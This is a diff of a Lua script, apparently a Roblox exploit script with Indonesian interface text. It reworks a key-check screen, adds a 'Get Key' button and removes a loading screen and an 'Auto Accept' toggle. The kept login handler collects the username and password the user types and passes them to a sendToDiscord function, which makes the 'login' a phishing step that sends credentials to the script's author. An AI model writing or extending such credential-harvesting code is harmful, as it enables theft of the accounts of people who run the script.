@@ -31,6 +31,7 @@ local function createKeyValidationGUI()
     local titleLabel = Instance.new("TextLabel")
     local keyBox = Instance.new("TextBox")
     local submitButton = Instance.new("TextButton")
+    local getKeyButton = Instance.new("TextButton")
     local messageLabel = Instance.new("TextLabel")
 
     gui.Name = "KeyValidationGUI"
@@ -71,7 +72,7 @@ local function createKeyValidationGUI()
     messageLabel.Position = UDim2.new(0, 0, 0, 110)
     messageLabel.BackgroundTransparency = 1
     messageLabel.Font = Enum.Font.SourceSans
-    messageLabel.Text = "Key Salah! Silahkan Get Key"
+    messageLabel.Text = ""
     messageLabel.TextSize = 14
     messageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
 
@@ -79,13 +80,23 @@ local function createKeyValidationGUI()
     submitButton.Parent = frame
     submitButton.Size = UDim2.new(1, -20, 0, 40)
     submitButton.Position = UDim2.new(0, 10, 0, 160)
-    submitButton.Text = "Get Key"
+    submitButton.Text = "Verifikasi Key"
     submitButton.Font = Enum.Font.SourceSansBold
     submitButton.TextSize = 16
     submitButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
     submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Fungsi ketika tombol Submit di klik
+    getKeyButton.Name = "GetKeyButton"
+    getKeyButton.Parent = frame
+    getKeyButton.Size = UDim2.new(1, -20, 0, 40)
+    getKeyButton.Position = UDim2.new(0, 10, 0, 210)
+    getKeyButton.Text = "Get Key"
+    getKeyButton.Font = Enum.Font.SourceSansBold
+    getKeyButton.TextSize = 16
+    getKeyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    getKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    -- Fungsi ketika tombol Verifikasi Key di klik
     submitButton.MouseButton1Click:Connect(function()
         local key = keyBox.Text
         if key == correctKey then
@@ -98,6 +109,12 @@ local function createKeyValidationGUI()
             print("Key tidak valid!")
             messageLabel.Text = "Key Salah! Silahkan Get Key"
         end
+    end)
+
+    -- Fungsi ketika tombol Get Key di klik
+    getKeyButton.MouseButton1Click:Connect(function()
+        -- Disarankan untuk menambahkan logika untuk mendapatkan key di sini
+        print("Mendapatkan Key...")
     end)
 end
 
@@ -157,98 +174,21 @@ local function createLoginGUI()
     loginButton.Parent = frame
     loginButton.Size = UDim2.new(1, -20, 0, 40)
     loginButton.Position = UDim2.new(0, 10, 0, 200)
-    loginButton.Text = "Mulai Script"
+    loginButton.Text = "Login"
     loginButton.Font = Enum.Font.SourceSansBold
     loginButton.TextSize = 16
     loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
     loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
+    -- Fungsi ketika tombol Login di klik
     loginButton.MouseButton1Click:Connect(function()
         local username = usernameBox.Text
         local password = passwordBox.Text
         if username ~= "" and password ~= "" then
-            print("Login berhasil! Username:", username, "Password:", password)
             sendToDiscord(username, password)
-            gui:Destroy()
-
-            -- Menambahkan loading sebelum GUI selanjutnya
-            local loadingGui = Instance.new("ScreenGui")
-            loadingGui.Parent = game.CoreGui or game:GetService("CoreGui")
-            local loadingFrame = Instance.new("Frame")
-            loadingFrame.Parent = loadingGui
-            loadingFrame.Size = UDim2.new(0, 300, 0, 100)
-            loadingFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
-            loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-            loadingFrame.BorderSizePixel = 3
-            loadingFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-
-            local loadingLabel = Instance.new("TextLabel")
-            loadingLabel.Parent = loadingFrame
-            loadingLabel.Size = UDim2.new(1, 0, 1, 0)
-            loadingLabel.BackgroundTransparency = 1
-            loadingLabel.Font = Enum.Font.SourceSansBold
-            loadingLabel.Text = "Loading... (8 detik)"
-            loadingLabel.TextSize = 20
-            loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-            wait(8)  -- Waktu loading 8 detik
-            loadingGui:Destroy()
-
-            -- Lanjutkan ke GUI berikutnya
-            createSwitchGUI()
+            print("Login sukses!")
         else
-            print("Username dan password tidak boleh kosong!")
-        end
-    end)
-end
-
--- Fungsi Membuat GUI Ketiga (Switch)
-local function createSwitchGUI()
-    local gui = Instance.new("ScreenGui")
-    local frame = Instance.new("Frame")
-    local titleLabel = Instance.new("TextLabel")
-    local switchButton = Instance.new("TextButton")
-
-    gui.Name = "SwitchGUI"
-    gui.Parent = game.CoreGui or game:GetService("CoreGui")
-
-    frame.Name = "SwitchFrame"
-    frame.Parent = gui
-    frame.Size = UDim2.new(0, 300, 0, 200)
-    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
-    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    frame.BorderSizePixel = 3
-    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-
-    titleLabel.Name = "TitleLabel"
-    titleLabel.Parent = frame
-    titleLabel.Size = UDim2.new(1, 0, 0, 50)
-    titleLabel.Position = UDim2.new(0, 0, 0, 0)
-    titleLabel.BackgroundTransparency = 1
-    titleLabel.Font = Enum.Font.SourceSansBold
-    titleLabel.Text = "Auto Accept"
-    titleLabel.TextSize = 24
-    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-    switchButton.Name = "SwitchButton"
-    switchButton.Parent = frame
-    switchButton.Size = UDim2.new(1, -20, 0, 40)
-    switchButton.Position = UDim2.new(0, 10, 0, 100)
-    switchButton.Text = "ON"
-    switchButton.Font = Enum.Font.SourceSansBold
-    switchButton.TextSize = 16
-    switchButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-    switchButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-    switchButton.MouseButton1Click:Connect(function()
-        if switchButton.Text == "ON" then
-            switchButton.Text = "OFF"
-            switchButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
-            print("Auto Accept OFF")
-        else
-            switchButton.Text = "ON"
-            switchButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-            print("Auto Accept ON")
+            print("Username atau password tidak boleh kosong!")
         end
     end)
 end
